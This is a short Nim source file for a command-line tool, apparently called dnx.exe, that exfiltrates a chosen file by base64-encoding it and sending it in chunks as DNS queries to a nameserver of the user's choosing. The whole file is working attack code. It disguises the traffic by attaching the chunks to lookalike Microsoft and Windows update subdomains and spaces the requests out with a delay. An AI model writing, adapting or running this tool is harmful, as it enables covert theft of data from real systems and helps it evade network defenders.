import os, ndns, strutils, random
from base64 import encode
randomize()

#[
TODO: 
    confirmar envio
]#

proc dnsExfiltrate(ns: string, target: string, slp: int): void =
    let
        content = readFile(target)
        hex = encode(content, safe=true).replace("=", "")
        header = initHeader(randId(), rd = true)
        client = initDnsClient(ns)
        chuckSize = 20 # max 62
        domains = [".client.a.msn.windows.com", ".a.wns.update.windows.com", ".a.wns.o365.microsoft.com", ".msft.a.msn.microsoft.com"]
    
    var stringindex: int

    echo "[+] Sending ", target

    try:
        while stringindex <= hex.len-1:
            let 
                query =  hex[stringindex .. (if stringindex + chuckSize - 1 > hex.len - 1: hex.len - 1 else: stringindex + chuckSize - 1)]
                dnsquery = query & sample(domains)
                question = initQuestion(dnsquery, QType.A, QClass.IN)
                msg = initMessage(header, @[question])
            #echo dnsquery
            discard(dnsAsyncQuery(client, msg))

            stringindex += chuckSize
            sleep(slp)

        let 
            question = initQuestion("quit", QType.A, QClass.IN)
            msg = initMessage(header, @[question])
        
        discard(dnsAsyncQuery(client, msg))
        echo "[+] Done!"
    
    except CatchableError as e:
        echo "[!] Error: ", e.msg

when isMainModule:
    if paramCount() < 3:
        echo "[!] Use: dnx.exe <IP> <File> <Time between requests in ms>"
        echo "[!] e.g: dnx.exe 127.0.0.1 file.pdf 1000"
        quit()
    else:
        dnsExfiltrate(paramStr(1), paramStr(2), parseInt(paramStr(3)))
